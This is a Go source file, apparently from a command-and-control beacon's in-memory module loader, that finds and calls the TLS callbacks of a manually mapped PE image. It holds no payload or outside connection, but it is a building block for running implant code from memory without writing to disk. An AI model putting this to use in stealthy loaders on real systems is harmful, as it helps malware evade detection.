package exectls

import (
	"syscall"
	"unsafe"

	"orsted/beacon/modules/memorymodule/utils/memmoduletypes"
	"orsted/beacon/utils"
)

type TLSCallback func(dllHandle uintptr, reason uint32, reserved uintptr)

const (
	DLL_PROCESS_ATTACH = 1
	DLL_PROCESS_DETACH = 0
)


func ExecuteTLS(pBaseAddress uintptr, pTlsDir memmoduletypes.PIMAGE_DATA_DIRECTORY) {
	pImgTlsDirectoryPtr := pBaseAddress + uintptr(pTlsDir.VirtualAddress)

	pImgTlsDirectory := (memmoduletypes.PIMAGE_TLS_DIRECTORY64)(unsafe.Pointer(pImgTlsDirectoryPtr))
	pcallBacks := pImgTlsDirectory.AddressOfCallBacks


	pCallbacksPtr := uintptr(pcallBacks)

    if pCallbacksPtr == 0 {
        return
    }
	callbacks := make([]uintptr, 0)
	for {
		callbackAddr := *(*uintptr)(unsafe.Pointer(pCallbacksPtr))
		if callbackAddr == 0 {
			break // Null-terminated
		}

		callbacks = append(callbacks, callbackAddr)

		// Move to the next address (uint64 pointer arithmetic)
		pCallbacksPtr += 8
	}

	for _, callbackAddr := range callbacks {
		_, _, err := syscall.SyscallN(uintptr(callbackAddr), pBaseAddress, uintptr(DLL_PROCESS_ATTACH), 0)
		if err != 0 {
			utils.Print("Error Occured in TLS", err.Error())
		}

	}
}
